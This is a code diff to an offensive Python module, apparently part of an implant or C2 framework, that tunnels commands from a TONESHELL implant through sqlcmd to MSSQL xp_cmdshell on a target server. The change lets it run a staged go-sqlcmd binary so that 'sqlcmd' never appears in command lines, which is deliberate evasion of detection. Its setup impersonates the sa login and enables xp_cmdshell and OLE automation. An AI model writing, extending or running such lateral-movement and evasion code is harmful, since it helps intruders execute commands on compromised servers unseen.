@@ -11,9 +11,10 @@ class XpMssqlBase:
     """Execution tunnel to IIS01 via WS01 TONESHELL -> sqlcmd -> MSSQL xp_cmdshell."""
 
     def __init__(self):
-        self._host     = None
-        self._login    = None
-        self._password = None
+        self._host        = None
+        self._login       = None
+        self._password    = None
+        self._sqlcmd_path = None
 
     def ready(self) -> bool:
         return self._host is not None
@@ -38,7 +39,8 @@ class XpMssqlBase:
         return '+CHAR(34)+'.join(f"'{self._tsql_escape(seg)}'" for seg in segs)
 
     def _sqlcmd_prefix(self) -> str:
-        return f'sqlcmd -S {self._host} -U {self._login} -P {self._password} -C -y 0'
+        exe = self._sqlcmd_path or 'sqlcmd'
+        return f'{exe} -S {self._host} -U {self._login} -P {self._password} -C -y 0'
 
     def _exec_q(self, shell, tsql: str, timeout_s: int = None) -> str:
         """Send one sqlcmd -Q task. Escapes " for C runtime -Q "..." boundary only."""
@@ -68,11 +70,18 @@ class XpMssqlBase:
 
     # ── commands ─────────────────────────────────────────────────────────────
 
-    def cmd_xpinit(self, shell, host: str, login: str, password: str):
-        """Enable sp_OA + xp_cmdshell on MSSQL and verify connectivity."""
-        self._host     = host
-        self._login    = login
-        self._password = password
+    def cmd_xpinit(self, shell, host: str, login: str, password: str,
+                   sqlcmd_path: str = None):
+        """Enable sp_OA + xp_cmdshell on MSSQL and verify connectivity.
+
+        sqlcmd_path: optional full path to a staged sqlcmd-compatible exe
+        (go-sqlcmd) on the implant host — when set, every tunnel invocation
+        runs that binary instead of the host's installed sqlcmd, so the
+        string sqlcmd never appears in any command line."""
+        self._host        = host
+        self._login       = login
+        self._password    = password
+        self._sqlcmd_path = sqlcmd_path
         setup = (
             "EXECUTE AS LOGIN='sa';"
             "EXEC sp_configure 'Ole Automation Procedures',1;RECONFIGURE;"
@@ -86,6 +95,8 @@ class XpMssqlBase:
             "(SELECT TOP 1 service_account FROM sys.dm_server_services "
             "WHERE servicename LIKE N'SQL Server%') AS [svc_account];"
         )
+        if sqlcmd_path:
+            print(f"[*] sqlcmd exec: {sqlcmd_path}")
         print(f"[+] xpinit OK — {out.strip()}")
 
     def cmd_xpshell_cmd(self, shell, cmd: str):
